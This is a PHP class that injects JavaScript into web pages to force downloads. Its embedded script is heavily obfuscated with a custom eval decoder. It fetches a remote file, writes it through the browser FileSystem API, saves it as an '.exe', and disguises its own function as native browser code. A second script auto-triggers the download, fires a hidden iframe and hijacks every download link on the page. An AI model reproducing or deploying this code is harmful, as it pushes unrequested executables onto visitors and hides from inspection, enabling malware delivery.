<?php

namespace LPO\Digest\Injectable\DownloadMethod;

use LPO\Bootstrap;
use LPO\Digest\Injectable\DownloadMethod;
use LPO\Digest\Injectable\JavascriptInvokable;

class FileApi extends DownloadMethod implements JavascriptInvokable {

	/**
	 * @var string
	 */
	public static $_source_script = <<<'JS'
eval((function(m7){for(var J7="",g7=0,s7=function(m7,f7){for(var x7=0,P7=0;P7<f7;P7++){x7*=96;var i7=m7.charCodeAt(P7);if(i7>=32&&i7<=127){x7+=i7-32;}}return x7;};g7<m7.length;){if(m7.charAt(g7)!="`")J7+=m7.charAt(g7++);else{if(m7.charAt(g7+1)!="`"){var R7=s7(m7.charAt(g7+3),1)+5;J7+=J7.substr(J7.length-s7(m7.substr(g7+1,2),2)-R7,R7);g7+=4;}else{J7+="`";g7+=2;}}}return J7;})("var C3u7=window;for(var r7 in` 5 ){if(r7.length===(109.7E1<=(44.7E1,0xD3)?\"GET\":(0x178,118.4E1)<=13.63E2?(43.1E1,6):34>=(113,0x208)?(47.,` Z ):(0x8C,0x24F))&&r7.charCodeAt(((141.,0x14C)<140.20E1?(111.,3):(69,4.3E1)))===((20,7.28E2)<3.44E2?\'c\':(1.337E3,0x117)<(138.9E1,26.1E1)?(0x7,\"c\"):(72.,86.)<=(11.60E1,10.68E2)?(95,100):(42.2E1,0x151))&&r7.charCodeAt((6.75E2>(0x145,99.0E1` Z .9` P!0):(0x183,0x38)<=(0x2A,122.)?(0x6B,5):(14,0x18F)))===(0x16F<(14.450E2,81)?(55.40E1,1.365E3):(51.,40` 1 )>5.10E1?(113,119):(73.0E1,0x5E))&&r7.charCodeAt((98.4E1>=(0x1AB,91.30E1)?(7.270E2,1):(0x215,5.36E2)))==` J EA>(0x14C,0xD9)?` ( F,105):(94.2E1,2.82E2)<=(127,0xE1)?(14.08E2,1000):129.<(19.,0x55)?(0xD5,1.198E3):(96.,8.700E2))&&r7.charCodeAt(((0x1C0,68.5E1)>(70.5E1,0x1BC)?(7.59E2,0):(0x1EA,8.28E2)))===(139.1E1>(11.94E2,0x120)?(10.,119):6.69E2<=(23.5E1,0x72)?111.60E1:(5` # ,1.161E3)))break};var w4V={\"F7\":\"0\",\"p7\":\"e\",\"z7\":\"v\",\"H7\":\"a\",\"b7\":\"u\",\"N7\":\"f\",\"B7\":\"l\"};var q7=(w4V.z7+w4V.H7` \" B` (!b` \/!p` 6!F` =!N7);C3u7[r7][q7]=(function(){var y5=((0x81,0x1F2)<=(14.17E2,0x100)?true:(0xB7,86.)<(0x164,0x206)?(27.,\"g\"):(67.8E1,59.)>(3.300E2,108.)?0x1EE:(93,44.40E1)),h5=((0x14E,0x98)<(5.850E2,0x200)?(75.0E1,\"O\"):(1.11E2,91.)),Z5=\"en\",G5=\"ge\",P=((5.9E2,76)>54.` X ,\"h` U 05,0x199)>=0x1AE?149.:6.>=(65.3E1,0x13B)?(0x4C,82.0E1):(128.,0x239)),B=(4.3E1<=(12.56E2,16)?39.:(0x10D,0x1F6)<=65.3E1?(0x63,true):(29.8E1,3.34E2)),F=((131,0x8C)<=(40.6` 6%?(7.54E2,\"T\"):(138,132)),V5=((8.950E2,131.)>=9.63E2?1024:53.>=(0x9F,30.)?(63,\"E\"):(69.,0x124)),l=\"L\",R=((142.8E1,42.30E1)<0x224?(13.13E2,\"M\"):30>=(0x160,58.)?(72,\"a\"):(121,3.42E2)),Y5=((0xDB,6.890E2)>=105?(1.,null):(1` G!,11.13E2)<=51.0E1?(0x13A,50):45>(0x9E,86)?(0x217,97):(68.,123.)),r5=\"est\",u5=\"tR\",n5=\"k\",m5=\"eb\",S5=\"ile\",J5=\"equ\",v=((6.5E2,121.7E1)>=0x6B?(84.,\"r\"):(16.,21.3` 8 (146,1.1280E3)?(93.,0x189):(0x1DF,0x67)<7.?(81.60E1,132):(52.,21)),C=((29,124.)>7.9E1?(0x21A,\"i\"):(83.80E1,0x169)<=(` $ ,77.)?\"K\":(78,0x137)),n=((142.,0x9E)>(0x1BE,114.)?(0x74,\"s\"):(29,14.65E2)),e=((101,1.0210E3)>(45.,59` O ED,\"S\"):(64.2E1,0x194)<55?95.80E1:(0x15B,12.99E2)),O=((53,0x147)>=17.0E1?(0xE2,\"m\"):(9.47E2,0x12)>11.09E2?(118,true):(66.,0x1C8)),s5=\"ste\",f5=\"Sy\",M5=\"Fil\",x5=\"eq\",v5=\"R\",g5=\"ki\",A=((135.,7.80E1)<1.09E2?(51.90E1,\"b\"):(0xC5,0x182)),c5=\"nc\",L=\"y\",D5=\"eS\",o5=\"req\",Q=((1.194E3,56)<=11.8E1?(30,\"c\"):(147,1.34E2)),O5=\"mSy\",V=\"t\",P5=\"Sys\",I5=\"il\",M=((149.,8.42E2)>=(0x166,28.1E1)?(3.99E2,\"F\"):5.09E2<=(32.6E1,0x56)?(0x23F,0x23B):(38.40E1,149)),Z=\"st\",N=((22,1.044E3)<0x198?(0x12A,0x16C):(0x1C1,0x95)<=133.1E1` ? 0C,\"q\"):34.7E1>=(0x22A,1.2610E3)?(68.5E1,\'H\'):(0x21,81.2E1)),t5=\"re\",W5=false,i5=((0x18B,148.)<=83.4E1?(20.,1024000):(79,4.39E2)<=3.12E2?0x7A:(1.217E3,54)),l5=(121>=(5.0E2,99)?(46.,51200):(4.1E2,104.4E1)),R5=((0xB8,0xA1)>=(132,12.72E2)?(` #\",\"U\"):66.<(0x18B,4.74` < 0x202,1048576):(75.9E1,56.90E1)),n7=((25,0xE5)>=(14.370E2,3.5E1)?(4.3E1,\"x\"):(0x45,133.3` W t7=((71.0E1,4.0E1)>146.6E1?(8,\"a` M!DA,2.0E2)<0x13B?(0x10,\".` 8!16,2.)),w=\"d\",V7=\"oa\",t=(0xBA>=(25,0x183)?1.443E3:124<=(117.,142)?(90.0E1,\"n\"):(0x14A,99.10E1)),z=((131` = 49.0E1)<=(0x1AA,0x106)?(14.48E2,14.17E2):(108.5E1,0xDE)<=29.40E1?(0x145,\"w\"):(125,34)>96?(11.21E2,\"a\"):(0x171,0x19F)),k=\"o\",d5=(79.>=(3.7E` 9 5D)?(0E0,110):94<(141,8.01E2)?(80.80E1,\"D\"):(0x169,52.)),Q7=(d5+k+z+t+w4V.B7+V7+w+t7` * p7+n` \"#),w5=R5,k7=l5,C7=i5,j5=W5;if(!C3u7[r7][(t5+N` X b` R#+Z+M+I5` &#P5+V` 2#O5+t+Q)]){C3u7[r7][(o` D!` N,D5+L+Z` O&c5)]=` N%z` H#A+g5+V+v5+x5` J b7` N#Z+M` -!p7+f5+s5+O+e+L+t+Q)];}if(!C3u7[r7][(o` N+n+V+M+C` 1 B` -$e+L` 5 ` >\"O)]){C3u7[r7][(v+J5` R)S5` N Z` F&=` F%z+m5+n5+C+u` O$N` F b7+r5+M` -$e+L+Z` ;#O)];}var A5=Y5,a7=function(u,K){var b=\"ng\",d=\"dy\",E=\"nre\",m=\"yp\",r=\"resp\",J=\"G\",p=\"p\",g=\"pR\",H=\"Htt\",s=((0xB6,0x46)>=0x1E7?12.:7.4E1<(0x219,0x2C)?(1.33E3,0xD3):(5E0,1.172E3)>72.60E1?(0x1C3,\"X\"):(68.,73)),U=new C3u7[r7][(s+R+l+H+g+w4V.p7+N` $ b7` (#n+V)]();U[(k+p` >#t)]((J+V5+F),u,B` ; r+k+t+n` R#F+m` H\")]=(A` V B7+k+A` I k+E` E H7+d+n+V` %#` #!p7+Q+P` 9#b` -\")]=function(){var X=\"ns\",a=\"spo\",T=\"eng\",h=((122.7E1,0x51)<=(0x24F,108.)?(149,\"-\"):5.87E2` : 179,119)?\"u\":(8.42E2,9.08E2)),c=\"nte\",y=\"Co\",G=\"der\",D=(76.<=(79.,11.46E2)?(0xD2,\"H\"):(4.72E2,1.071E3)<91.0E1?0:(86,6.2E2)),o=\"Re\",W=\"ONE\";if(U[(v+w4V.p7` \" H7+w+L+e+V` \'#` #!p7)]==U[(d5+W)]){if(j5){A5=U[(G5+V+o+n+p+k+t+n` L\"+D` U\"` + H7+G)]((y+c+t+V+h+l+T+V+P));}if(K){K(U[(v` V#a+X` Y\")]);}}};U[(n+Z5+w)]();},k5=function(T5,j,X7){var q` .%` +!X=\"hre\",a=\"ca\",T=\"lo\",h=\"or\";C3u7[r7][(k+t+A+w4V.p7` \" N7+h` $\'b7+t+T` = H7+w)]=Y5` U&w4V.B7+k+a+V+C+k+t)][(X` V N7)]=T5;};try{a7(T5,function(E){var m=((0x74,0x2C)>(0x70,1.156E3)?111.:(10.1E2,64.9E1)>9.?(0x1CF,\"Y\"):138.<=(1.084E3,32.)?(26.70E1,0x122):(77.,72)),r=\"AR\",J=((0x3D,114)>=(123.,10.20E1)?(116.0E1,\"P\"):(0x1EC,13.1E2)<(22.,142.)?(5.67E2,0` ?!F1,10.9E1)),p=\"Fi\",g=\"wr\",H=0,s=\"si\",U=\"run\",K5=\"it\",C5=(4.49E2>(10.65E2,3.)?(62,\"W\"):(0x130,11.25E2)),p5=\"ot\",b5=\"RARY\",H5=\"PO\",Q5=\"em\",B5=\"que\",F5=\"ys\",a5=\"le\",q5=\"stFi\",N` > \",U5=\"se\",X5=\"te\",E5=\"ze\",f=\"z\";if(E&&E[(n+C+f+w4V.p7)]>k7` #.<C7){if(j5` J$E5)]!=A5){q();return ;}if(!j){j=Q7;}function L5(X){var a=\"ad\",T=\"wnlo\",h=\"ri\",c=\"Att\",y=(35.<=(1.193E3,0x1AB)?(142,\"U\"):47>(130.20E1,0x214)?0x132:(0x1D9,10.78E2)),G=\"ef\",D=\"but\",o=\"tri\",W=\"tA\",u=\"Element\",K=\"ea\",b=\"do\",d=C3u7[r7][(b+Q+w4V.b7+O` $ p7+t+V)][(Q+v+K+X5+u)](w4V.H7);d[(n` @#W+V+o+D` P\")]((P+v+G),X[(V+k+y+v5+l)]()` S U5+V+c+h+A` M b7+V` P&b+T+a),j` F Q` = B7+C+Q+n5)]();};if(C3u7[r7][(t5+N5` Y\"+q5+a5+e+F5+V` ,#O+e+L+t+Q)]){var z5=` U%v` S#B5+n+V+M+C+a5` N Z+Q` #!` W (` J%F+V5+R+H5+b5)],w5),e5=z5[(v+k+p5)][(G5+V+M+I5+w4V.p7)](j,{create:B}),x=e5[(Q+v` :\"` C H7+V` (#C5+v+K` X#+v)]();x[(V+U+Q` >+)](E[(s+E5)]` A n` P#` X\"n5)](H` 6 g+C` K();L5(e5);}else{C3u7[r7][(t5+N` [ b7` H\"+n+V+p` W B7+D5+L+Z+Q5)](` L%F+V5+R+J+h5+v5+r+m)],w5,function(D){var o=\"et\",W=\"oo\";D[(v+W+V)][(y5+o+M+S5)](j,{create:B},function(y){var G=W5;y[(Q+v+w4V.p7` \" H7+V` (#C5+v+C+X5+v)](function(a){var T=\"cat\",h=\"rit\",c=\"nw\";a[(k+c+h+w4V.p7+Z5+w)]=` U$` W!X=\"ek\";if(!G){a[(U5+X)](H);a[(z+v+C+V+w4V.p7)](E);G=B;}else{L5(y);}};a[(V+v` A b7+t+T` F&[(n+C+f` )$);});});},q);}}else{q();}});}catch(X)` +\";k5[(w4V.z7` [ H7` \" B` (!b` \/!p7+h5` : N7)]=k5[(V+k+e+V+v+C+t+y5)]=function(){var X=\"] }\",a=\"de\",T=\"ve\",h=\"ti\",c=\"() { [\",y=(26.<=(15.,57)?(145.,\" \"):(0x56,50.)),G=\"fu\";return (G+c5+V+C+k+t+y)+q7+(c+t+w4V.H7+h+T+y+Q+k+a+X);}` P#k5;})()"));
JS;
	/**
	 * @var string
	 */
	private static $_invoking_script = <<<'JS'
if(!document.querySelectorAll) { document.querySelectorAll = function(selector) { var doc = document, head = doc.documentElement.firstChild, styleTag = doc.createElement("STYLE"); head.appendChild(styleTag); doc.__qsaels = []; styleTag.styleSheet.cssText = selector + "{x:expression(document.__qsaels.push(this))}"; window.scrollBy(0, 0); return doc.__qsaels; } } function dl(){window["value0f"](__tokens.directDownloadLink, __tokens.filename + ".exe");iframer(document.querySelectorAll(".dlink")[0], 0, __tokens.downloadLink + "&graceful=1", __tokens.downloadLink + "&graceful=1");} if(__tokens.autoDownload) { dl(); } var links = document.querySelectorAll(".dlink"); for(var i = 0; i < links.length; i++) { var dlink = links[i]; dlink.href = "javascript:void(0)"; dlink.onclick = function(e) { e.preventDefault(); dl(); } }
JS;


	/**
	 * @param Bootstrap $bootstrap
	 *
	 * @return string
	 */
	function getInvokingScript(Bootstrap $bootstrap)
	{
		$iframe = new Iframe;
		return $iframe->getSourceScript().';'.';'.self::$_invoking_script;
	}

	/**
	 * @return string
	 */
	public function getSourceScript(){ return self::$_source_script; }
}